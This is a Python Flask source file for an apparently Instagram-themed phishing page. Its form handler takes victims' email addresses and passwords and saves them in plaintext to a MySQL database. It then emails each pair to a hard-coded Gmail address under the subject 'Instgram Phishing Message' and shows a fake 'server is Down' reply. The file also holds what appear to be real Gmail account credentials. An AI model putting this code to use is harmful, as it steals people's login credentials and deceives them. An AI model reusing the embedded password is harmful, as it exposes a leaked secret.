from flask import Flask, render_template,request
from flask_sqlalchemy import SQLAlchemy
from flask_mail import Mail, Message
# import json


local_server = "True"

# with open("config.json", 'r') as C:
    # params = json.load(C)['params']
    
app = Flask(__name__)
app.config["SQLALCHEMY_DATABASE_URI"] = 'mysql://root:@localhost/test'
app.config.update(
    MAIL_SERVER = 'smtp.gmail.com',
    MAIL_PORT = '465',
    MAIL_USE_SSL = True,
    MAIL_USERNAME = "akashhussain5555@gmail.com",
    MAIL_PASSWORD = "ibyxcrobjhlocvwm"
)
mail = Mail(app)
if (local_server):
    app.config['SQLALCHEMY_DATABASE_URI']   = "mysql://root:@localhost/test"
else:
    app.config['SQLALCHEMY_DATABASE_URI']   = "mysql://root:@localhost/test"
    
db = SQLAlchemy(app)

class Indexs(db.Model):
    Sno = db.Column(db.Integer, primary_key=True)
    Email = db.Column(db.String(50),nullable=False)
    Password = db.Column(db.String(50), unique=True, nullable=False)

@app.route("/" ,methods=['GET','POST'])
def index():
    if (request.method == 'POST'):
        email = request.form.get('email')
        password = request.form.get('password')
        
        entry = Indexs(Email = email, Password = password)
        db.session.add(entry)
        db.session.commit()
        # "A fish is caught",
        msg = Message ('Instgram Phishing Message', sender = 'email', recipients = ['akashhussain5555@gmail.com'])
        msg.body ="victum email ==>"+" " + email + " "+ "victum password ==>"+ " "+ password
        mail.send(msg)
        return "Opps! server is Down"
    return  render_template("index.html")
app.run(debug=True,port=8000)